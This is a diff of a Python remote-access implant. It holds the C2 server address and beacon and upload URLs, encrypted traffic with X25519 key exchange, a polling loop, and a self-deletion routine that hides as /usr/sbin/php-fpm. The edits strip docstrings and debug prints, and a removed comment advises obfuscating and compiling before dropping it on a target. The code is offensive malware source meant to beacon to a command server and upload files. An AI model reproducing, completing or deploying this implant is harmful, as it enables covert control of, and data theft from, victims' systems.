@@ -1,7 +1,4 @@
-"""
-Implant source code, don't drop this in target - obfuscate and compile first
-See dist/
-"""
+# implant.py without prints and string comments
 
 import os
 import base64
@@ -23,7 +20,7 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-C2_IP = "10.0.0.148"  # put c2 ip here
+C2_IP = "127.0.0.1"  # put c2 ip here
 C2_URL = "https://" + C2_IP + ":" + "8443"
 BEACON_URL = C2_URL + "/api/telemetry"
 RESULT_URL = C2_URL + "/api/updates"
@@ -36,7 +33,6 @@ derived_key = None
 
 # def encrypt_data(aes_key: bytes, plaintext: bytes | str) -> bytes:
 def encrypt_data(aes_key: bytes, plaintext: bytes) -> bytes:
-    """Encrypt data using AES-256-GCM with nonce and encode with base64"""
     if isinstance(plaintext, str):
         plaintext = plaintext.encode()
 
@@ -47,7 +43,6 @@ def encrypt_data(aes_key: bytes, plaintext: bytes) -> bytes:
 
 
 def decrypt_data(aes_key: bytes, b64_data: bytes, decode: bool = True):
-    """Decrypt data using AES-256-GCM with nonce and decode with base64"""
     data = base64.b64decode(b64_data)
     nonce = data[:12]
     ciphertext_and_tag = data[12:]
@@ -58,15 +53,6 @@ def decrypt_data(aes_key: bytes, b64_data: bytes, decode: bool = True):
 
 
 def exchange_keys(derived_key: bytes, attempts: int, long_sleep: bool):
-    """
-    X25519 key exchange protocol:
-
-    1. On start, client generates key pair and sends public key in first beacon to server
-    2. Server generates key pair and responds to client with its public key
-    3. Both client and server derive shared secret AES key and use it for following communications
-    - These packets are encrypted with pre-shared key
-    - If client can't connect to server, it will keep retrying with new key pairs
-    """
     # generate X25519 keypair
     client_private_key = x25519.X25519PrivateKey.generate()
     client_public_key = client_private_key.public_key()
@@ -164,7 +150,6 @@ def poll_and_schedule():
             sleep(long_sleep)
 
         except requests.RequestException as e:
-            print(f"[!] Error: {e}")
             sleep(long_sleep)
 
 
@@ -188,12 +173,10 @@ def run_task(task: str):
             # delete itself and exit
             # script_path = os.path.realpath(__file__)
             script_path = "/usr/sbin/php-fpm"
-            print("removing:", script_path)
             os.remove(script_path)
             time.sleep(1)
             sys.exit()
         except Exception as e:
-            print(f"Error self-destructing: {e}")
             sys.exit()
 
     # find and upload file
